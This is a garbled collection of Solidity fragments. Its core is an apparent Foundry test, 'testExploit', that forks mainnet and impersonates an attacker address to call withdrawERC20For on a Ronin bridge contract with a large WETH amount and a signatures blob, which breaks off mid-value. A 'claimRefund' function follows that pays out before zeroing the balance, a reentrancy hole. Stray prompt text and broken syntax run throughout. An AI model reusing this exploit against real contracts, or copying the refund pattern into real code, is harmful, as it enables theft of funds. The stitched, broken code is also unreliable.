
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

The output should look like this:;

;
;
interface IRoninBridge {
    function withdrawERC20For(uint256 _withdrawalId, address _user, address _token, uint256 _amount, bytes memory _signatures) external};
contract ContractTest is DSTest {
  address attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;
  address roninBridge = 0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2;
  address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("mainnet", 14442834)};
  function testExploit() public {
    cheats.startPrank(attacker);
    IRoninBridge(roninBridge).withdrawERC20For({
      _withdrawalId: 2000000,
      _user: attacker,
      _token: WETH,
      _amount: 173600000000000000000000,
      _signatures: hex"01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d891
function depositETH(address payable locker) public {
    (bool sent, ) = locker.call{value: 1 ether}("");
    require(sent)}
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}